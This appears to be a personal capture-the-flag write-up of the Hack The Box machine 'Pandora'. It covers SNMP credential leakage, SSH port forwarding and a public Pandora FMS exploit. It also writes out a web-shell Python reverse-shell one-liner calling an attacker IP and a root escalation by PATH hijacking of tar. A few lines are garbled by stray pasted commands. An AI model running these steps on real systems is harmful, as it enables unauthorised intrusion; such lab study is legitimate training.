### port scan

>└─$ nmap -p- -sSCV 10.10.11.136  --min-rate 999
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 19:22 AEDT
Nmap scan report for 10.10.11.136
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing

>└─$ nmap -sU  10.10.11.136  --min-rate 999 -T 5 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 19:59 AEDT
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 95.47% done; ETC: 19:59 (0:00:00 remaining)
Nmap scan report for 10.10.11.136
Host is up (0.10s latency).
Not shown: 990 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
161/udp   open   snmp

>└─$ nmap -sU -sV -p 161 10.10.11.136  --min-rate 999 -T 5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 20:04 AEDT
Nmap scan report for 10.10.11.136
Host is up (0.079s latency).

>PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: pandora

##### port 80 - web nothing

##### port 161- snmp.

snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 > snmp-full-bullk

>iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (372749) 1:02:07.49
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.25.4.2.1.5.974 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.1098 = STRING: "-u daniel -p HotelBabylon23"

//we get a credential, ssh
```└─$ ssh daniel@10.10.11.136 
daniel@pandora:~$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
```

daniel@pandora:/var/www/pandora$ ls
index.html  pandora_console

daniel@pandora:/var/www/pandora$ ss -pantu
Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process    
udp      ESTAB     0         0             10.10.11.136:35251            1.1.1.1:53                 
udp      ESTAB     0         0             10.10.11.136:35569            1.1.1.1:53                 
udp      ESTAB     0         0                127.0.0.1:38699         127.0.0.53:53                 
udp      UNCONN    0         0            127.0.0.53%lo:53               0.0.0.0:*                  
udp      UNCONN    0         0                  0.0.0.0:161              0.0.0.0:*                  
udp      UNCONN    0         0                    [::1]:161                 [::]:*                  
tcp      LISTEN    0         80               127.0.0.1:3306             0.0.0.0:*                  
tcp      LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*                  
tcp      LISTEN    0         128                0.0.0.0:22               0.0.0.0:*                  
tcp      ESTAB     0         36            10.10.11.136:22            10.10.16.6:37736              
tcp      LISTEN    0         511                      *:80                     *:*                  
tcp      LISTEN    0         128                   [::]:22                  [::]:*                  
daniel@pandora:/var/www/pandora$ curl localhost 53
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">

daniel@pandora:/var/www/pandora/pandora_console$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 



//check http service conf, get another domainname for dir of pandora, which is supposed to be access on localhost only

daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>

//local portforwarding, or use dynamic port forwarding

ssh -L localhost:9000:127.0.0.1:80 daniel@10.10.11.136
ssh -D 9000 daniel@10.10.11.136

http://127.0.0.1:9000/pandora_console/
v7.0NG.742_FIX_PERL2020 //it is pandora fms

https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py

http://127.0.0.1:9000/pandora_console/images/cmd.php?test=id
uid=1000(matt) gid=1000(matt) groups=1000(matt)

http://127.0.0.1:9001/pandora_console/images/cmd.php?test=export%20RHOST=%2210.10.16.16%22;export%20RPORT=8821;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27

└─$ nc -nvlp 8821
listening on [any] 8821 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.11.136] 36668
$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
matt@pandora:/var/www/pandora/pandora_console/images$ 

find / -writable -user root -type f -perm -u=x 2>/dev/null

-rwsr-x--- 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup

matt@pandora:/home/matt/.ssh$ find / -perm -u=s 2>/dev/null
find / -perm -u=s 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfnsnmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 > snmp-full-bullk
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1


matt@pandora:/usr/bin$ ./pandora_backup
./pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
Backup failed!
Check your permissions!
// the reason is: prevented any shells that are children of Apache from accessing SUID binaries 
// what to do is break the restrict shell, ssh to host or , use -u=s at to spawn a shell.

//way1:
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null

//way2:
ssh-keygen -t rsa 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/ed/.ssh/id_rsa): /tmp/ssh/id_rsa
Enter passphrase for "/tmp/ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/ssh/id_rsa
Your public key has been saved in /tmp/ssh/id_rsa.pub
The key fingerprint is:
SHA256:cCsaciQ8eIVUNc6K23VPQcSw/zTEkKCiCTCHUxuXqDs ed@kali
The key's randomart image is:
+---[RSA 3072]----+
|o+=++oo o=+.     |
|+=o=.o o ooo     |
|oo* o = o . o    |
|.o B o o o o     |
| .= + o S o o    |
|E  = + o o o .   |
| .. o     . .    |
|                 |
|                 |
+----[SHA256]-----+
                               
└─$ python3 -m http.server 80   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.136 - - [14/Dec/2025 08:55:24] "GET /id_rsa.pub HTTP/1.1" 200 -


└─$ ssh -i id_rsa matt@10.10.11.136

//now we are matt now, can run the backup binary, which started to backup, try tar * under that folder to ES failed. means here not use tar *


matt@pandora:/var/www/pandora/pandora_console$ ltrace /usr/bin/pandora_backup
getuid()                                                     = 1000
geteuid()                                                    = 1000
setreuid(1000, 1000)                                         = 0
puts("PandoraFMS Backup Utility"PandoraFMS Backup Utility
)                            = 26
puts("Now attempting to backup Pandora"...Now attempting to backup PandoraFMS client
)                  = 43
system("tar -cvf /root/.backup/pandora-b"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                       = 512
puts("Backup failed!\nCheck your permis"...Backup failed!
Check your permissions!
)                 = 39
+++ exited (status 1) +++

//tar command is not full path 

matt@pandora:/tmp$ nano tar

cat tar
#!/bin/bash
/bin/bashsnmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 > snmp-full-bullk

matt@pandora:/tmp$ chmod +x tar
matt@pandora:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:/tmp$ export PATH=/tmp:$PATH
matt@pandora:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

matt@pandora:/tmp$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/tmp# id
uid=0(root) gid=1000(matt) groups=1000(matt)

//lesson learned:
> snmpbulkwalk
> apache config, for services more than one on a same port , with diff dir
> strings = xxd; ltrace to view binary file

